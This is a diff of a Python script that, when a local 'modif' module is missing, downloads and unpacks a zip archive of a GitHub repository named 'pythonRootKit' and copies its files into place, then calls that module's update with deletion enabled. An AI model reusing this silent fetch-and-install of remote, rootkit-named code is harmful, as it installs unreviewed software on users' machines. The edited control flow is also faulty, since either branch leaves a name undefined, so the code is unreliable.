@@ -4,7 +4,8 @@ import zipfile
 import os
 import shutil
 import time
-import modif
+data = "https://github.com/N0SAFE/pythonRootKit/archive/main.zip"
+
 
 def getpath(change=False):
     if change in (False, "not", "\\"):
@@ -57,11 +58,14 @@ def moveFileFromDir(data):
             shutil.copy(path, getpath(True))
     print(fichiers)
 
-data = "https://github.com/N0SAFE/pythonRootKit/archive/main.zip"
-dir = getNameDir(data)
-downloadFileGithub(data)
-moveFileFromDir(dir)
-supDir(dir)
+try:
+    import modif
+except:
+    dir = getNameDir(data)
+    downloadFileGithub(data)
+    moveFileFromDir(dir)
+    supDir(dir)
 
-# modif.update(dir, delete=True)
-# None
+modif.update(dir, delete=True)
+
+#fichiers modifier
